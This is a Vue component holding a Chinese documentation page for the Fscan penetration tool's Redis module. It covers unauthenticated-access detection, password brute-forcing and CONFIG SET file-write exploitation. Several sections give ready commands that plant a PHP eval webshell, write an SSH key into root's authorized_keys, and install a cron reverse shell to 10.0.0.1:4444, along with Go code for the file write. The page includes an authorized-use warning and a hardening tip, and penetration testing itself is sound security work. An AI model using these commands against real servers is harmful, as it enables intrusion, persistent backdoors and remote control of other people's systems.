<template>
  <div>
    <!-- 文档头部区域 -->
    <div class="flex items-center mb-6">
      <div
        class="w-10 h-10 flex-shrink-0 rounded-lg mr-3 flex items-center justify-center"
        :class="isDark ? 'bg-red-900/30' : 'bg-red-100'"
      >
        <Icon
          icon="mdi:database"
          class="text-xl"
          :class="isDark ? 'text-red-400' : 'text-red-600'"
        />
      </div>
      <h1
        class="text-2xl font-bold transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-900'"
      >
        Redis 扫描指南
      </h1>
    </div>

    <!-- 内容概览 -->
    <div
      class="mb-6 rounded-lg p-3 transition-colors duration-300"
      :class="isDark ? 'bg-gray-800 border border-gray-700' : 'bg-gray-50 border border-gray-200'"
    >
      <div class="flex items-center mb-2">
        <Icon
          icon="mdi:format-list-bulleted"
          class="mr-2"
          :class="isDark ? 'text-gray-400' : 'text-gray-500'"
        />
        <h3
          class="font-medium text-sm transition-colors duration-300"
          :class="isDark ? 'text-gray-200' : 'text-gray-700'"
        >
          内容概览
        </h3>
      </div>
      <ul class="pl-4 space-y-1">
        <li
          v-for="(section, index) in contentSections"
          :key="index"
          class="transition-colors duration-200 text-sm font-normal"
          :class="isDark ? 'text-gray-400 hover:text-red-400' : 'text-gray-600 hover:text-red-600'"
        >
          <a :href="`#section-${index}`" class="hover:underline">{{ section }}</a>
        </li>
      </ul>
    </div>

    <!-- 主要内容 -->
    <div
      class="doc-content transition-colors duration-300"
      :class="isDark ? 'text-gray-300' : 'text-gray-700'"
    >
      <p class="mb-4">
        Redis 扫描是 Fscan 的重要功能之一，用于发现网络中的 Redis
        服务、检测弱密码及未授权访问，并支持多种文件写入功能。本指南详细介绍 Redis
        扫描的工作原理、配置选项和最佳实践。
      </p>

      <h2
        id="section-0"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        Redis 扫描简介
      </h2>

      <p class="mb-4">
        Redis（Remote Dictionary
        Server）是一种开源的内存数据库，具有高性能、灵活性和广泛的应用场景。Fscan 的 Redis
        扫描模块可以：
      </p>

      <ul class="pl-5 list-disc space-y-2 mb-6">
        <li>发现内网中开放的 Redis 服务（默认端口 6379）</li>
        <li>检测 Redis 未授权访问漏洞</li>
        <li>进行密码爆破</li>
        <li>利用 Redis 的 CONFIG SET 功能进行任意文件写入</li>
        <li>支持 SSH 公钥写入和定时任务写入</li>
      </ul>

      <div
        class="p-3 rounded-lg mb-6 text-sm font-normal"
        :class="
          isDark ? 'bg-red-900/10 border border-red-900/20' : 'bg-red-50 border border-red-100'
        "
      >
        <div class="flex">
          <Icon
            icon="mdi:shield-alert"
            class="text-lg flex-shrink-0 mt-0.5 mr-2"
            :class="isDark ? 'text-red-400' : 'text-red-600'"
          />
          <div>
            <p class="font-medium" :class="isDark ? 'text-red-300' : 'text-red-700'">安全提示</p>
            <p class="mt-1" :class="isDark ? 'text-red-200' : 'text-red-800'">
              Redis
              扫描功能应当仅用于合法的安全测试和授权的渗透测试。未经授权对系统进行扫描与利用可能违反法律法规。
            </p>
          </div>
        </div>
      </div>

      <h2
        id="section-1"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        扫描原理与流程
      </h2>

      <p class="mb-4">Redis 扫描模块采用多阶段扫描策略，高效识别和利用目标系统：</p>

      <div class="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
        <div
          class="p-4 rounded-lg border transition-colors duration-300"
          :class="isDark ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'"
        >
          <div class="flex items-center mb-2">
            <div
              class="w-6 h-6 rounded-md flex items-center justify-center mr-2"
              :class="isDark ? 'bg-green-900/20' : 'bg-green-100'"
            >
              <span class="text-xs font-bold" :class="isDark ? 'text-green-400' : 'text-green-600'"
                >1</span
              >
            </div>
            <h3 class="font-medium" :class="isDark ? 'text-gray-200' : 'text-gray-800'">
              服务发现
            </h3>
          </div>
          <p class="text-sm" :class="isDark ? 'text-gray-400' : 'text-gray-600'">
            扫描目标 IP 范围，识别开放 Redis 服务（默认端口 6379）的主机
          </p>
        </div>

        <div
          class="p-4 rounded-lg border transition-colors duration-300"
          :class="isDark ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'"
        >
          <div class="flex items-center mb-2">
            <div
              class="w-6 h-6 rounded-md flex items-center justify-center mr-2"
              :class="isDark ? 'bg-green-900/20' : 'bg-green-100'"
            >
              <span class="text-xs font-bold" :class="isDark ? 'text-green-400' : 'text-green-600'"
                >2</span
              >
            </div>
            <h3 class="font-medium" :class="isDark ? 'text-gray-200' : 'text-gray-800'">
              未授权访问检测
            </h3>
          </div>
          <p class="text-sm" :class="isDark ? 'text-gray-400' : 'text-gray-600'">
            尝试无密码连接 Redis，发送 INFO 命令检测服务器是否允许未授权访问
          </p>
        </div>

        <div
          class="p-4 rounded-lg border transition-colors duration-300"
          :class="isDark ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'"
        >
          <div class="flex items-center mb-2">
            <div
              class="w-6 h-6 rounded-md flex items-center justify-center mr-2"
              :class="isDark ? 'bg-green-900/20' : 'bg-green-100'"
            >
              <span class="text-xs font-bold" :class="isDark ? 'text-green-400' : 'text-green-600'"
                >3</span
              >
            </div>
            <h3 class="font-medium" :class="isDark ? 'text-gray-200' : 'text-gray-800'">
              密码爆破
            </h3>
          </div>
          <p class="text-sm" :class="isDark ? 'text-gray-400' : 'text-gray-600'">
            如果无法未授权访问，则使用多线程技术尝试常见密码，支持自动重试和超时控制
          </p>
        </div>

        <div
          class="p-4 rounded-lg border transition-colors duration-300"
          :class="isDark ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'"
        >
          <div class="flex items-center mb-2">
            <div
              class="w-6 h-6 rounded-md flex items-center justify-center mr-2"
              :class="isDark ? 'bg-green-900/20' : 'bg-green-100'"
            >
              <span class="text-xs font-bold" :class="isDark ? 'text-green-400' : 'text-green-600'"
                >4</span
              >
            </div>
            <h3 class="font-medium" :class="isDark ? 'text-gray-200' : 'text-gray-800'">
              漏洞利用
            </h3>
          </div>
          <p class="text-sm" :class="isDark ? 'text-gray-400' : 'text-gray-600'">
            成功访问后，可利用 Redis CONFIG SET 功能进行任意文件写入，包括 SSH 密钥和定时任务
          </p>
        </div>
      </div>

      <p class="mb-4">
        内部实现采用高效的协程池管理，确保即使在大规模扫描时也能保持稳定性和性能。扫描过程中会考虑全局超时和单个连接超时，避免资源浪费。
      </p>

      <h2
        id="section-2"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        配置参数与选项
      </h2>

      <p class="mb-4">Redis 扫描提供多种配置选项，以适应不同的扫描需求：</p>

      <div class="overflow-x-auto mb-6">
        <table
          class="min-w-full rounded-lg overflow-hidden text-sm font-normal"
          :class="isDark ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'"
        >
          <thead :class="isDark ? 'bg-gray-850' : 'bg-gray-50'">
            <tr>
              <th
                class="py-3 px-4 text-left font-medium border-b"
                :class="isDark ? 'text-gray-300 border-gray-700' : 'text-gray-700 border-gray-200'"
              >
                参数
              </th>
              <th
                class="py-3 px-4 text-left font-medium border-b"
                :class="isDark ? 'text-gray-300 border-gray-700' : 'text-gray-700 border-gray-200'"
              >
                说明
              </th>
              <th
                class="py-3 px-4 text-left font-medium border-b"
                :class="isDark ? 'text-gray-300 border-gray-700' : 'text-gray-700 border-gray-200'"
              >
                示例
              </th>
            </tr>
          </thead>
          <tbody class="divide-y" :class="isDark ? 'divide-gray-700' : 'divide-gray-200'">
            <tr
              v-for="param in redisParameters"
              :key="param.name"
              :class="isDark ? 'hover:bg-gray-750' : 'hover:bg-gray-50'"
            >
              <td class="py-2 px-4 font-mono" :class="isDark ? 'text-red-400' : 'text-red-600'">
                {{ param.name }}
              </td>
              <td class="py-2 px-4" :class="isDark ? 'text-gray-300' : 'text-gray-700'">
                {{ param.description }}
              </td>
              <td class="py-2 px-4 font-mono" :class="isDark ? 'text-gray-400' : 'text-gray-500'">
                {{ param.example }}
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <h2
        id="section-3"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        未授权访问检测
      </h2>

      <p class="mb-4">
        Redis 未授权访问是常见的安全问题，Fscan 会自动尝试进行无密码连接并发送 INFO 命令进行检测：
      </p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">// RedisUnauth 尝试Redis未授权访问检测
func RedisUnauth(ctx context.Context, info *Common.HostInfo) (flag bool, err error) {
    realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
    Common.LogDebug(fmt.Sprintf("开始Redis未授权检测: %s", realhost))

    // 创建带超时的连接
    conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
    if err != nil {
        return false, err
    }
    defer conn.Close()

    // 发送info命令测试未授权访问
    if _, err = conn.Write([]byte("info\r\n")); err != nil {
        return false, err
    }

    // 读取响应
    reply, err := readreply(conn)
    if err != nil {
        return false, err
    }

    // 检查未授权访问
    if !strings.Contains(reply, "redis_version") {
        return false, nil
    }

    // 发现未授权访问，获取配置
    dbfilename, dir, err = getconfig(conn)

    return true, nil
}</code></pre>
        </div>
      </div>

      <div
        class="p-3 rounded-lg mb-6 text-sm font-normal"
        :class="
          isDark
            ? 'bg-amber-900/10 border border-amber-900/20'
            : 'bg-amber-50 border border-amber-100'
        "
      >
        <div class="flex">
          <Icon
            icon="mdi:lightbulb"
            class="text-lg flex-shrink-0 mt-0.5 mr-2"
            :class="isDark ? 'text-amber-400' : 'text-amber-600'"
          />
          <div>
            <p class="font-medium" :class="isDark ? 'text-amber-300' : 'text-amber-700'">
              防护提示
            </p>
            <p class="mt-1" :class="isDark ? 'text-amber-200' : 'text-amber-800'">
              防止 Redis 未授权访问的关键措施包括设置强密码、绑定内部 IP
              地址、禁用危险命令，以及使用防火墙限制对 Redis 端口的访问。
            </p>
          </div>
        </div>
      </div>

      <h2
        id="section-4"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        密码爆破
      </h2>

      <p class="mb-4">当 Redis 服务启用了密码保护，Fscan 会自动尝试使用内置密码字典进行爆破：</p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">// concurrentRedisScan 并发扫描Redis服务
func concurrentRedisScan(ctx context.Context, info *Common.HostInfo, credentials []RedisCredential,
                          timeoutMs int64, maxRetries int) *RedisScanResult {
    // 使用ModuleThreadNum控制并发数
    maxConcurrent := Common.ModuleThreadNum
    if maxConcurrent <= 0 {
        maxConcurrent = 10 // 默认值
    }

    // 创建工作池
    var wg sync.WaitGroup
    resultChan := make(chan *RedisScanResult, 1)
    workChan := make(chan RedisCredential, maxConcurrent)

    // 启动工作协程
    for i := 0; i < maxConcurrent; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for credential := range workChan {
                // 尝试Redis认证
                result := tryRedisCredential(ctx, info, credential, timeoutMs, maxRetries)
                if result.Success {
                    resultChan <- result
                    return
                }
            }
        }()
    }

    // 发送工作和等待结果
    // ...
}</code></pre>
        </div>
      </div>

      <p class="mb-4">
        密码爆破过程使用协程池并发测试多个密码，支持自动重试和超时控制，提高了扫描效率。
      </p>

      <h2
        id="section-5"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        任意文件写入功能
      </h2>

      <p class="mb-4">
        Redis 的一个重要安全特性是可以通过 CONFIG SET
        命令修改数据库配置，这可能被利用来写入任意文件。Fscan 提供了多种文件写入功能：
      </p>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        1. 任意路径文件写入
      </h3>

      <p class="mb-4">通过指定目标路径和内容，实现向目标系统写入自定义文件：</p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                             :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -rwp /var/www/html/shell.php -rwc "&lt;?php phpinfo(); ?&gt;"</code></pre>
        </div>
      </div>

      <p class="mb-4">内部实现会自动分离目录和文件名，并通过 Redis 的 CONFIG SET 功能写入文件：</p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">// writeCustomFile 向指定路径写入自定义内容
func writeCustomFile(conn net.Conn, dirPath, fileName, content string) (flag bool, text string, err error) {
    // 设置文件目录
    if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dirPath))); err != nil {
        return flag, text, err
    }
    // 读取响应...

    // 设置文件名
    if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", fileName))); err != nil {
        return flag, text, err
    }
    // 读取响应...

    // 写入内容
    safeContent := strings.ReplaceAll(content, "\"", "\\\"")
    safeContent = strings.ReplaceAll(safeContent, "\n", "\\n")

    if _, err = conn.Write([]byte(fmt.Sprintf("set x \"%s\"\r\n", safeContent))); err != nil {
        return flag, text, err
    }
    // 读取响应...

    // 保存更改
    if _, err = conn.Write([]byte("save\r\n")); err != nil {
        return flag, text, err
    }
    // 读取响应...

    return true, "Success", nil
}</code></pre>
        </div>
      </div>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        2. 从本地文件写入
      </h3>

      <p class="mb-4">
        可以将本地文件的内容写入到目标系统，适用于需要写入大文件或二进制文件的场景：
      </p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -rwp /var/www/html/shell.php -rwf local_shell.php</code></pre>
        </div>
      </div>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        3. SSH 公钥写入
      </h3>

      <p class="mb-4">向目标系统写入 SSH 公钥，实现免密登录：</p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub</code></pre>
        </div>
      </div>

      <p class="mb-4">
        此功能会尝试将公钥写入到目标系统的 <code>/root/.ssh/authorized_keys</code> 文件中。
      </p>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        4. 定时任务写入
      </h3>

      <p class="mb-4">写入反弹Shell的定时任务，建立持久性连接：</p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -rs 10.0.0.1:4444</code></pre>
        </div>
      </div>

      <p class="mb-4">
        此功能会尝试将反弹Shell的定时任务写入到目标系统的 cron 目录中，格式为
        <code>* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code>。
      </p>

      <div
        class="p-3 rounded-lg mb-6 text-sm font-normal"
        :class="
          isDark
            ? 'bg-green-900/10 border border-green-900/20'
            : 'bg-green-50 border border-green-100'
        "
      >
        <div class="flex">
          <Icon
            icon="mdi:check-circle"
            class="text-lg flex-shrink-0 mt-0.5 mr-2"
            :class="isDark ? 'text-green-400' : 'text-green-600'"
          />
          <div>
            <p class="font-medium" :class="isDark ? 'text-green-300' : 'text-green-700'">
              最佳实践
            </p>
            <p class="mt-1" :class="isDark ? 'text-green-200' : 'text-green-800'">
              在执行文件写入操作后，Fscan 会自动恢复 Redis 的原始配置（dbfilename 和
              dir），减少对目标系统的影响。
            </p>
          </div>
        </div>
      </div>

      <h2
        id="section-6"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        高级设置
      </h2>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        线程控制
      </h3>

      <p class="mb-4">
        Redis 扫描模块使用 <code>ModuleThreadNum</code> 参数控制并发线程数，可以通过
        <code>-t</code> 参数设置：
      </p>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.0/24 -p 6379 -m redis -t 100</code></pre>
        </div>
      </div>

      <p class="mb-4">内部实现会自动根据线程数和凭据数量调整工作池大小，优化资源利用。</p>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        超时设置
      </h3>

      <p class="mb-4">Redis 扫描支持两层超时控制：</p>

      <ul class="pl-5 list-disc space-y-2 mb-6">
        <li>
          <strong>单个连接超时</strong>：通过 <code>-time</code> 参数设置每个 Redis
          连接尝试的最大时间（秒）
        </li>
        <li>
          <strong>全局超时</strong>：通过
          <code>-timeout</code> 参数设置整个扫描任务的最大执行时间（秒）
        </li>
      </ul>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -time 3 -timeout 300</code></pre>
        </div>
      </div>

      <div
        class="p-3 rounded-lg mb-6 text-sm font-normal"
        :class="
          isDark
            ? 'bg-amber-900/10 border border-amber-900/20'
            : 'bg-amber-50 border border-amber-100'
        "
      >
        <div class="flex">
          <Icon
            icon="mdi:lightbulb"
            class="text-lg flex-shrink-0 mt-0.5 mr-2"
            :class="isDark ? 'text-amber-400' : 'text-amber-600'"
          />
          <div>
            <p class="font-medium" :class="isDark ? 'text-amber-300' : 'text-amber-700'">提示</p>
            <p class="mt-1" :class="isDark ? 'text-amber-200' : 'text-amber-800'">
              在扫描大型网络时，合理设置超时参数非常重要。过短的超时可能导致漏报，而过长的超时会降低扫描效率。建议根据网络环境调整这些参数。
            </p>
          </div>
        </div>
      </div>

      <h2
        id="section-7"
        class="text-xl font-bold mt-8 mb-4 pb-2 border-b transition-colors duration-300"
        :class="isDark ? 'text-white border-gray-700' : 'text-gray-800 border-gray-200'"
      >
        应用场景与示例
      </h2>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        快速扫描整个网段
      </h3>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.0/24 -p 6379 -m redis</code></pre>
        </div>
      </div>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        使用自定义密码字典
      </h3>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -pwd redis123,password,admin123</code></pre>
        </div>
      </div>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        写入 WebShell
      </h3>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                             :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -rwp /var/www/html/shell.php -rwc "&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;"</code></pre>
        </div>
      </div>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        写入 SSH 公钥
      </h3>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub</code></pre>
        </div>
      </div>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        写入反弹 Shell 定时任务
      </h3>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.10 -p 6379 -m redis -rs 10.0.0.1:4444</code></pre>
        </div>
      </div>

      <h3
        class="text-lg font-semibold mt-5 mb-3 transition-colors duration-300"
        :class="isDark ? 'text-white' : 'text-gray-800'"
      >
        禁用 Redis 利用功能
      </h3>

      <!-- 优化后的代码块，移除灰色背景 -->
      <div class="mb-4">
        <div
          class="rounded-lg overflow-hidden border transition-colors duration-300"
          :class="isDark ? 'border-gray-700 bg-gray-800/50' : 'border-gray-200 bg-gray-50'"
        >
          <pre class="p-3 text-sm font-mono overflow-x-auto"><code
class="transition-colors duration-300"
                                                                   :class="isDark ? 'text-gray-100' : 'text-gray-800'">./fscan -h 192.168.1.0/24 -p 6379 -m redis -noredis</code></pre>
        </div>
      </div>

      <p class="mb-4">
        使用 <code>-noredis</code> 参数可以禁用 Redis 漏洞利用功能，仅执行扫描和认证。
      </p>
    </div>

    <!-- 简化的文档反馈 -->
    <div
      class="mt-8 pt-4 border-t transition-colors duration-300 text-sm"
      :class="isDark ? 'border-gray-700' : 'border-gray-200'"
    >
      <a
        href="https://github.com/shadow1ng/fscan/issues"
        target="_blank"
        class="inline-flex items-center transition-colors duration-200"
        :class="isDark ? 'text-red-400 hover:text-red-300' : 'text-red-600 hover:text-red-700'"
      >
        <Icon icon="mdi:github" class="mr-1.5" />
        <span>在 GitHub 上反馈问题</span>
      </a>
    </div>
  </div>
</template>

<script setup>
import { inject, ref } from 'vue'
import { Icon } from '@iconify/vue'

// 从父组件获取暗黑模式状态
const isDark = inject('isDark', ref(false))

// 内容章节标题（用于目录）
const contentSections = [
  'Redis 扫描简介',
  '扫描原理与流程',
  '配置参数与选项',
  '未授权访问检测',
  '密码爆破',
  '任意文件写入功能',
  '高级设置',
  '应用场景与示例',
]

// Redis参数表格数据
const redisParameters = [
  { name: '-m redis', description: '启用 Redis 扫描模块', example: '-m redis' },
  { name: '-p 6379', description: '指定 Redis 端口（默认为 6379）', example: '-p 6379,7379' },
  { name: '-pwd', description: '指定密码列表，多个用逗号分隔', example: '-pwd redis,admin,123456' },
  { name: '-rwp', description: '指定要写入的文件路径', example: '-rwp /var/www/html/shell.php' },
  { name: '-rwc', description: '指定要写入的文件内容', example: '-rwc "<?php phpinfo(); ?>"' },
  { name: '-rwf', description: '指定从本地读取内容的文件', example: '-rwf local_shell.php' },
  { name: '-rf', description: '指定 Redis 写入的 SSH 公钥文件', example: '-rf ~/.ssh/id_rsa.pub' },
  { name: '-rs', description: '指定 Redis 写入的计划任务内容', example: '-rs 10.0.0.1:4444' },
  { name: '-t', description: '设置并发线程数', example: '-t 50' },
  { name: '-time', description: '设置单个连接超时时间（秒）', example: '-time 3' },
  { name: '-timeout', description: '设置全局扫描超时时间（秒）', example: '-timeout 600' },
  { name: '-noredis', description: '禁用 Redis 安全检测与利用功能', example: '-noredis' },
]
</script>

<style scoped>
/* 添加 bg-gray-750 和 bg-gray-850 兼容性 */
.bg-gray-750 {
  background-color: rgb(38, 42, 51);
}
.bg-gray-850 {
  background-color: rgb(30, 34, 43);
}

/* 主要内容样式调整 */
.doc-content p {
  line-height: 1.6;
}

/* 代码样式优化 */
.doc-content code {
  font-family:
    ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New',
    monospace;
  font-size: 0.875rem;
  padding: 0.1rem 0.3rem;
  border-radius: 0.2rem;
  background-color: rgba(0, 0, 0, 0.1);
}

.dark .doc-content code {
  background-color: rgba(255, 255, 255, 0.1);
}

/* 代码块强化样式 */
pre code {
  display: block;
  background: transparent !important;
  padding: 0 !important;
}

/* 代码高亮优化 */
.code-keyword {
  color: #d27e74;
}
.code-string {
  color: #ce9178;
}
.code-comment {
  color: #6a9955;
  font-style: italic;
}

/* 字体优化 */
h1,
h2,
h3,
h4,
h5,
h6,
p,
li,
a,
span,
div,
td,
th {
  font-family:
    -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans',
    'Droid Sans', 'Helvetica Neue', sans-serif;
}

pre,
code {
  font-family:
    ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New',
    monospace;
}

/* 代码块左侧边框指示器 */
pre {
  position: relative;
  border-left: 3px solid rgba(219, 56, 56, 0.4);
}

.dark pre {
  border-left: 3px solid rgba(219, 56, 56, 0.6);
  filter: brightness(1.1);
}

/* 代码块复制按钮 */
pre::after {
  content: '复制';
  position: absolute;
  top: 0.5rem;
  right: 0.5rem;
  padding: 0.25rem 0.5rem;
  font-size: 0.75rem;
  border-radius: 0.25rem;
  cursor: pointer;
  opacity: 0;
  transition: opacity 0.2s;
  background-color: rgba(255, 255, 255, 0.1);
  color: inherit;
}

pre:hover::after {
  opacity: 1;
}

/* 改进内容可读性 */
.doc-content {
  line-height: 1.7;
  font-size: 1rem;
}

/* 表格行间距优化 */
tbody tr {
  transition: background-color 0.15s ease-in-out;
}

/* 链接交互效果 */
a {
  transition: all 0.2s ease;
}
</style>
